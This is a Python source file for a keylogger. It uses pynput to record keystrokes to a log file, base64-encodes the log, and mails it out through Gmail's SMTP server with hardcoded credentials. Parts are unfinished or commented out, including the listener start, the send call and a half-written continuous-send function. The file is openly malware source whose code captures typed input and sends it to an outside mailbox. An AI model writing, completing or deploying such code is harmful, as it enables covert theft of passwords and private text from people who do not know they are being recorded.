from pynput import keyboard
import base64
import smtplib, ssl
import threading
import os
import datetime


substitute ={

	'Key.enter': '[ENTER]\n',
	'Key.backspace': '[BACKSPACE]', 
	'Key.space': ' ',
	'Key.alt': '[ALT]',
	'Key.tab': '[TAB]',
	'Key.delete': '[DEL]',
	'Key.ctrl': '[CTRL]',
	'Key.left': '[LEFT ARROW]', 
	'Key.right': '[RIGHT ARROW]', 
	'Key.shift': '[SHIFT]',
	'Key.caps_lock': '[CAPS LK]',
	'Key.cmd':'[WINDOWS KEY]',
	'Key.print_screen': '[PRNT SCR]',
	'Key.esc':'[ESC]'

	}


def send_log():

	port=465

	sender_mail = "dummyboii666@gmail.com"
	password = "Password not to forget"
	receiver_email = "dummyboii666+some@gmail.com"

	# Create a secure SSL context
	context = ssl.create_default_context()

	message = encode("logs.txt")

	print("[+] the logs is encoded and is getting ready to send ......")

	with smtplib.SMTP_SSL("smtp.gmail.com",port,context=context) as server:
		server.login(sender_mail,password)
		print("[+] the log file is now being sent....")

		server.sendmail(sender_mail,receiver_email,message)
		print("[+] the logs has been sent....")


def encode(filename):
	with open(filename,"r") as file:
		data = file.read()
		encoded = base64.b64encode(data.encode())

	return encoded.decode()


def on_press(key):
	with open("logs.txt","a") as logs:
		try:
			logs.write(key.char)
		except AttributeError:
			logs.write(substitute[str(key)]+" ")

def on_release(key):
	if key==keyboard.Key.esc:
		print("\n")
		print("[+] the listener will stop working")
		# send_log()

		print("[-] the program will close in T minus 5 seconds...")
		return False


# with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
# 	listener.join(5) # close after 5 secs.

def continous_send_logs():
	logfile_name = str(datetime.datetime.now())

	try:
		os.mkdir("logs")
	except FileExistsError:
		pass

x = encode("asset/logs.txt")
print(x)





